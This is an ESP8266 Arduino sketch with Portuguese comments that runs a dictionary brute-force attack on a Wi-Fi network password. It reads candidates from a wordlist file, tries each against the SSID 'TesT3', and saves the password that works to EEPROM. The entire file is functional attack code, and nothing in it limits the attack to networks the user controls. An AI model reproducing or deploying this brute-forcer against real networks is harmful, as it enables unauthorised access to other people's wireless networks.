#include <LittleFS.h>
#include <EEPROM.h>
#include <ESP8266WiFi.h>

#define EEPROM_SIZE 512

File file;
const char* ssid = "TesT3";

void abrirArquivo() {
  pinMode(LED_BUILTIN, OUTPUT);
  
  if (file) file.close();

  file = LittleFS.open("/wordlist.txt", "r");
  if (!file) {
    Serial.println("Erro ao abrir /wordlist.txt");
  } else {
    Serial.println("Arquivo aberto com sucesso.");
    Serial.print("Tamanho do arquivo: ");
    Serial.println(file.size());
  }
}

void setup() {
  Serial.begin(115200);

  if (!LittleFS.begin()) {
    Serial.println("Erro ao montar LittleFS");
    while (true); // trava o sistema se LittleFS falhar
  }

  EEPROM.begin(EEPROM_SIZE);
  EEPROM.write(0, false);    // flag fim do arquivo
  EEPROM.write(1, false);    // flag senha encontrada
  EEPROM.write(2, '\0');     // limpa o início da senha
  EEPROM.commit();

  abrirArquivo();
  digitalWrite(LED_BUILTIN, HIGH); // apaga

}

void loop() {
  if (!file) {  // arquivo aberto?
    Serial.println("Arquivo não está aberto!");
    delay(1000);
    return;
  }

  bool fim = EEPROM.read(0);
  if (fim) { // chegou ao fim?
    digitalWrite(LED_BUILTIN, LOW);  // acende
    Serial.println("Fim do arquivo, sem resultado");
    delay(20000);
    return;
  }

  bool senha = EEPROM.read(1);
  if (senha) { // obteve senha?
    digitalWrite(LED_BUILTIN, LOW);  // acende
    // Lê e imprime a senha armazenada
    char senha_capturada[EEPROM_SIZE - 2];
    for (int i = 2; i < EEPROM_SIZE; i++) {
      senha_capturada[i - 2] = EEPROM.read(i);
      if (senha_capturada[i - 2] == '\0') break;
    }
    Serial.print("Frase lida da EEPROM: ");
    Serial.println(senha_capturada);
    delay(20000);
    return;
  }

  if (!file.available()) { // ainda tem mais senhas pra testar?
    EEPROM.write(0, true);  // marca que chegou ao fim
    EEPROM.commit();
    return;
  }

  Serial.print("Posição atual do ponteiro: ");
  Serial.println(file.position());

  // Lê uma linha do arquivo
      Serial.println("\nAinda falta");
      Serial.println(file.available());

  String linha = file.readStringUntil('\n');
  linha.trim();

  Serial.print("Tentando conectar com senha: ");
  Serial.println(linha);

  WiFi.begin(ssid, linha.c_str());

  int tentativas = 0;
  while (WiFi.status() != WL_CONNECTED && tentativas < 10) {
    delay(1000);
    Serial.print(".");
    tentativas++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConectado com sucesso!");

    EEPROM.write(1, true); // senha encontrada

    // Grava a senha na EEPROM a partir da posição 2
    int i = 0;
    for (; i < linha.length() && (i + 2) < EEPROM_SIZE - 1; i++) {
      EEPROM.write(i + 2, linha[i]);
    }
    EEPROM.write(i + 2, '\0'); // terminador de string

    EEPROM.commit();
  } else {
    Serial.println("\nFalha na conexão Wi-Fi.");
  }

}
